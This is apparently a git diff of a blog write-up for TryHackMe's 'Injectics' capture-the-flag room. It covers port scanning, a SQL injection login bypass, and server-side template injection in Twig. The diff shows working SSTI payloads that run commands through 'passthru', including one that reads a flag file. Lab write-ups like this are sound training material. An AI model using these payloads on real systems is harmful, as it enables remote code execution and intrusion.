@@ -8,7 +8,7 @@ tags: ["thm","writeup","sqli","ssti"]
 In this occasion we will be solving TryHackMe's room Injectics.
 URL: https://tryhackme.com/r/room/injectics
 
-## recon
+## Recon
 
 First start with checking which ports we have opened for the challenge. We can see we will be working with 22, and 80 ports. So next we have to check which services are running on those ports.
 
@@ -18,7 +18,7 @@ sudo rustscan -a 10.10.81.229 --tries 2 --ulimit 5000 -g -- --no-nmap
 10.10.81.229 -> [22,80]
 ```
 
-## service scanning
+### Service Scanning
 
 ```
 Host is up, received user-set (0.35s latency).
@@ -86,7 +86,8 @@ script.js
 This script shows that they tried to filter out some special chars and words to prevent SQLinjections. we cannot use them on the frontend. But is there anything on the backend? ;)
 
 ![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224182844.png)
-# exploit
+
+# Exploitation
 
 So we proceed to intercept the login function on the webpage as follows.
 
@@ -149,7 +150,12 @@ Now, notice we have a new tab called profile, let's inspect it. We can see a inp
 I've used this resource.
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 
-Injecting a basic PoC to verify code execution `{{5*8}}`
+Injecting a basic PoC to verify code execution 
+```php
+{% raw %}
+{{5*8}}
+{% endraw %}
+```
 
 ![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185349.png)
 
@@ -160,7 +166,9 @@ We can see in the main page that the results of the operation has been processed
 Then, try the following payload and confirm Remote Code Execution.
 
 ```php
+{% raw %}
 {{['id',""]|sort('passthru')}}
+{% endraw %}
 ```
 
 ![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185835.png)
@@ -184,11 +192,17 @@ Next, inspect the flag directory to see the filename of the flag file.
 Finally, use the following payload to get the flag value.
 
 ```php
+{% raw %}
 {{['cat ./flags/<REDACTED>.txt',""]|sort('passthru')}}
+{% endraw %}
 ```
 
 ![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224190356.png)
 
-## conclusions
+## Summary
 
 This room included some interesting vulnerabilities, first bypassing a login page using SQLinjection bypass techniques, using a second order SQLinjection to get access to the admin panel, and finally using a Server Side Template Injection vulnerability in Twig template engine to achieve Remote Code Execution. I hope you like this writeup and. hack the planet!
+
+{% raw %}
+<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=67379" style="border:none;"></iframe>
+{% endraw %}
